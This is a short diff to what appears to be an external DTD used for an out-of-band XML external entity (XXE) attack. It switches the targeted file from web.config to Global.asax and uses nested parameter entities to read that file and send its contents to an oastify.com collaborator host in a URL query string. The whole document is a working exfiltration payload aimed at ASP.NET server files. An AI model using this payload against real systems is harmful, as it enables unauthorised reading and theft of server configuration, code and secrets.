@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///web.config">
+<!ENTITY % file SYSTEM "file:///Global.asax">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://k4p5hywglyjsasymak8v627ec5iy6n.oastify.com/?x=%file;'>">
 %eval;
 %exfiltrate;
